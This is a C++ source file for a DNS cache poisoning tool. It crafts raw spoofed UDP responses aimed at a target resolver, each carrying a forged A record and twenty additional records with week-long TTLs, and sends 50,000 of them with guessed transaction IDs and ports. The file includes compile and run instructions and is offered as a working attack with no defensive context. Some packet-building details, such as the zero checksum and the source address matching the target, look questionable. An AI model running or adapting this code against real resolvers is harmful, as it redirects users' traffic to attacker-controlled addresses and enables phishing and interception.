// Compile: g++ -o extra_overflow extra_overflow.cpp
// Run: sudo ./extra_overflow <target_dns> <domain> <spoof_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class ExtraSectionOverflow {
private:
    std::string targetDNS, domain, spoofIP;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    ExtraSectionOverflow(const std::string& dns, const std::string& d,
                         const std::string& spoof)
        : targetDNS(dns), domain(d), spoofIP(spoof) {}
    
    // Response with massive additional section
    // Exploits resolvers that trust additional section blindly
    void sendExtraHeavy(uint16_t txid, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[2048];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);   // QDCOUNT
        *(uint16_t*)(dns + 6) = htons(1);   // ANCOUNT
        *(uint16_t*)(dns + 8) = htons(0);   // NSCOUNT
        *(uint16_t*)(dns + 10) = htons(20); // ARCOUNT - 20 additional records!
        
        int pos = 12;
        
        // Question
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        // Main answer: A -> spoofIP
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(spoofIP.c_str(), &addr);
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        // 20 additional records all pointing to attacker-controlled domains
        // Each poisons a different domain in resolver's cache
        for (int i = 0; i < 20; i++) {
            std::string extraDomain = "extra" + std::to_string(i) + "." + domain;
            pos += encodeName(dns + pos, extraDomain);
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // A
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // IN
            *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // Long TTL
            *(uint16_t*)(dns + pos) = htons(4); pos += 2;
            memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        }
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] Extra section overflow poisoning\n";
        std::cout << "[*] Sending 20 additional A records per response\n";
        
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            sendExtraHeavy(txid, port);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <dns> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    ExtraSectionOverflow poison(argv[1], argv[2], argv[3]);
    poison.run(50000);
    return 0;
}
